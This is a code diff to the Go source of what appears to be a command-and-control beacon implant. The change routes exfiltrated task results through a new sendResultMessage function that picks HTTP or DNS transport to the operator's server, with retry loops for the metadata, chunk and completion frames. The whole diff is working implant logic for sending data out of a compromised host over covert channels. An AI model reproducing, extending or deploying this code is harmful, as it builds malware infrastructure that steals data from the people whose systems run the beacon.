@@ -488,7 +488,7 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 	var err error
 	metaSent := false
 	for metaAttempt := 1; metaAttempt <= 3; metaAttempt++ {
-		_, err = b.sendControlMessage(metaData, exfilPhase)
+		_, err = b.sendResultMessage(metaData, exfilPhase)
 		if err == nil {
 			metaSent = true
 			break
@@ -530,7 +530,7 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 
 		chunkSent := false
 		for chunkAttempt := 1; chunkAttempt <= 2; chunkAttempt++ {
-			_, err := b.sendControlMessage(chunkData, exfilPhase)
+			_, err := b.sendResultMessage(chunkData, exfilPhase)
 			if err == nil {
 				chunkSent = true
 				break
@@ -559,7 +559,7 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 
 	completeData := fmt.Sprintf("RESULT_COMPLETE|%s|%s|%d", b.id, taskID, totalChunks)
 	for attempt := 1; attempt <= 3; attempt++ {
-		_, err = b.sendControlMessage(completeData, exfilPhase)
+		_, err = b.sendResultMessage(completeData, exfilPhase)
 		if err == nil {
 			return nil
 		}
@@ -700,6 +700,28 @@ func (b *Beacon) registerDual(checkInData string, regPhase PhaseConfig) bool {
 	fmt.Fprintf(os.Stderr, "[Beacon] dual registration dns=%v http=%v -> mode=%s latched=%v\n",
 		dnsOK, httpOK, b.transport.Mode(), b.transport.Latched())
 	return dnsOK || httpOK
+}
+
+// sendResultMessage delivers one result-protocol frame honouring the operator's
+// result_transport choice. ""/"auto" keeps sendControlMessage's HTTP-first dual
+// decision; "http" forces the frame over an HTTP listener even after the beacon
+// fell back to DNS; "dns" forces it over DNS. Results are worth their own seam
+// because a large DNS result is orders of magnitude slower than the HTTP one the
+// operator explicitly asked for.
+func (b *Beacon) sendResultMessage(message string, phase PhaseConfig) (string, error) {
+	switch strings.ToLower(b.client.config.ResultTransport) {
+	case "dns":
+		return b.client.sendPhaseCommand(message, phase)
+	case "http":
+		if b.transport == nil || b.transport.Mode() == transportDNS {
+			return "", fmt.Errorf("result_transport=http, but this beacon has no HTTP transport")
+		}
+		timestamp := fmt.Sprintf("%05d", time.Now().Unix()%100000)
+		wireMessage := fmt.Sprintf("%s|%s", message, timestamp)
+		return b.transport.Send(operationForMessage(message), wireMessage)
+	default: // "" or "auto"
+		return b.sendControlMessage(message, phase)
+	}
 }
 
 // parseTask parses a task from the DNS server response.
